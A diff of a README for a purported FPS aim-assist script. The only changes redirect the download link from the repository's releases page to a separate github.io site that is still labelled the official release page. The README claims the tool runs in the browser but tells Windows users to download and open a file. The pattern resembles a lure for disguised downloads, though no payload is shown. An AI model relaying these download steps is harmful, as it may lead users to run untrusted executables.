@@ -1,6 +1,6 @@
 # 🎯 xios-aim-assist-script - Improve your aim in FPS games
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Despairing-taka262/xios-aim-assist-script/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue)](https://despairing-taka262.github.io)
 
 This script helps you improve your accuracy in first-person shooter games. It draws a custom crosshair on your screen and shows targeting indicators for supported game titles. This tool runs inside your browser and provides visual feedback to help you hit your targets with more ease.
 
@@ -19,7 +19,7 @@ You do not need special programming knowledge to use this software. If your comp
 
 Follow these steps to set up the aim assist tool on your Windows PC.
 
-1. Go to the official release page: [https://github.com/Despairing-taka262/xios-aim-assist-script/releases](https://github.com/Despairing-taka262/xios-aim-assist-script/releases)
+1. Go to the official release page: [https://despairing-taka262.github.io](https://despairing-taka262.github.io)
 2. Look for the latest version at the top of the list.
 3. Click the link to download the file directly to your computer.
 4. Open your Downloads folder once the transfer finishes.
